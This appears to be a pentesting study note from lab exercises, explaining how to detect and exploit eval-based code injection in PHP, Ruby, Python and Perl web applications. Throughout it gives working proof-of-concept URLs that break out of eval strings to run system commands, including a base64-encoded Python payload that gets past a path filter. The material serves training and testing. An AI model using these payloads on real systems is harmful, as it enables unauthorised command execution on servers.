# Code Execution

As with SQL injection, you can inject commands to test and ensure you have a code injection:

* By using comments and injecting ```/* random value */```.
* By injecting a simple concatenation ```"."``` (where " are used to break the syntax and     reform it correctly, replacing the parameter you provided with a string concatenation, for example ```"."ha"."cker"."``` instead of hacker.

Don't forget that you will need to URL-encode some of the characters (```#``` and```;```) before sending the request.

You can also use time-based detection for this issue by using the PHP function ```sleep```. You will see a time difference between:

* Not using the function sleep or calling it with a delay of zero: ```sleep(0)```.
* A call to the function with a long delay: ```sleep(10)```. 

Obviously, the code injection should be in the language used by the application. Therefore, the first step in an injection is to find what language is used by the application. To do so you can look at the response's headers, generate errors or look at the way special characters are handled by the application (for example by comparing + and . for concatenation of strings.

This example is a trivial code injection. If you inject a single quote, nothing happens. However, you can get a better idea of the problem by injecting a double quote: 

```Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/index.php(6) : eval()'d code on line 1```

Based on the error message, we can see that the code is using the function eval: "Eval is evil...".

We saw that the double quote breaks the syntax, and that the function eval seems to be using our input. From this, we can try to work out payloads that will give us the same results:

* ```"."``` - we are just adding a string concatenation; this should give us the same value.
* ```"./*pentesterlab*/"``` - we are just adding a string concatenation and information inside comments; this should give us the same value.

Now that we have similar values working, we need to inject code. To show that we can execute code, we can try to run a command (for example uname -a using the code execution). The full PHP code looks like:

```system('uname -a');```

The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:

* By adding dummy code: ```".system('uname -a'); $dummy=".```
* By using comment: ```".system('uname -a');#``` or ```".system('uname -a');//```.



## PHP

* Comment out code: ```//``` (%2f%2f)
* Run a command:   ```system('ls')

Try adding ```;}%2f%2f``` - eg: ```?order=id;}%2f%2f```. In this example we can inject arbitrary code and gain code execution using `?order=id);}system('uname%20-a');//` 

#### pcre_replace_eval

Another very dangerous modifier exists in PHP: `PCRE_REPLACE_EVAL` (`/e`). This modifier will cause the function `preg_replace` to evaluate the new value as PHP code, before performing the substitution. This is deprecated as of PHP 5.5.0.

Vulnerable code:```http://domainname/?new=hacker&pattern=/lamer/&base=Hello%20lamer```

POC: ```http://domainname/?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer```

#### Assert

Vuln Code: ```http://example.com/?name=hacker```

POC: ```http://example.com/?name=phpinfo():%20hacker%27.phpinfo().%27```



## Ruby

In this exercise, we are dealing with a Ruby application as you can quickly tell by injecting a double quote in the `username` parameter.

Since the application is in development mode, we get a lot of details on the error. The following line is especially interesting:

```ruby
@message = eval "\"Hello "+params['username']+"\""
```

Here, we will need to do the following:

* A double-quote `"` to break out of the string.
* Add a `+` sign for string concatenation (don't forget to URL-encode it - ```%2b```)
* Add a call to the command (`[COMMAND]`) we want to run using ``` `[COMMAND]` ```.
* Add another `+` sign for string concatenation.
* Another double-quote `"` to close the one that was already there.

POC: ```http://example.com/?username=hacker%22%2b`uname -a`%2b%22```



## Python

In this exercise, we are dealing with a Python application. Like with the previous exercise, we can see that injecting a double-quote give us an error. First, let's see how we can properly close the double-quote. We can inject a `+` (properly encoded - ```%2b```) and another double-quote to get a response without error.

Now, we need to make sure it's a Python application, we can for example use: `"%2bstr(True)%2b"test`. The fact that both `str()` and `True` are available give us a pretty good chance that Python is used. For the rest of the challenge we will put our payload inside of the call to `str()`.

We can see a `0` coming back in the response. This shows that the command got executed successfully. If you try an invalid command like `hacker`, you will get `32512` meaning that the process returned `127` (since the command is not found).

It may also be valuable to get the value returned by the command. To do this, you can use: `os.popen('[CMD]').read()` instead of `os.system('[CMD]')`. 

If we try to use `os.system('id')` for example. we get an error message. This is likely due to the fact that the `os` module (that we need to access `system`) is not loaded. We can use the following syntax to load and run the `system` function: `__import__('os').system(...`. 

The previous challenge allowed `/` in the path since the following Flask route was used:
``` @app.route('/hello/')```

This challenge prevents `/` in the path since the following route is used: 
```@app.route('/hello/user')```

This is obviously something you can only guess by trial and error. We can go back to the previous payload using `id` and it will work. However, we can't run  `/usr/local/bin/score` (since we need a `/`).

POC: ```http://example.com/hello/hacker%22%2bstr(__import__('os').system('command'))%2b%22test```

To bypass this issue, we can use base64 encoding. We will send a base64 encoded command to the server (to avoid the `/` in the path) and tell the server to decode it using the function `b64decode`. The call to `b64decode` will be done by the server as part of our payload.  Unfortunately the `base64` module is not loaded, so we will need to use the `__import__` trick to load `base64`. Finally, the command to score will need to be base64-encoded before being sent to the server (so the payload can decode it).

1. Start with evidence of code injection: ```http://example.com/hello/hacker"%2b""%2b"``` (doesn't throw an error)
2. Replace centre "" with str() and insert a command: ```http://example.com/hello/hacker"%2bstr(__import__('os').popen('uname -a').read())%2b"```
3. Should return uname details. Next step is to construct a base64 encoded payload so that we don't need to insert '/' into the URL:
	* Command to run: ```/usr/local/bin/score b1fca3c7-443e-4923-b598-a95b41e94b65```
	* Base64 encoded version: ```L3Vzci9sb2NhbC9iaW4vc2NvcmUgYjFmY2EzYzctNDQzZS00OTIzLWI1OTgtYTk1YjQxZTk0YjY1```
4. Resulting POC: ```http://example.com/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode('L3Vzci9sb2NhbC9iaW4vc2NvcmUgYjFmY2EzYzctNDQzZS00OTIzLWI1OTgtYTk1YjQxZTk0YjY1')).read())%2b%22```

Lesson: Executing code should be outside the payload - only encode the string to be passed to it.



## Perl

```hacker2%27.`uname -a`.%27```

The . performs a concatenation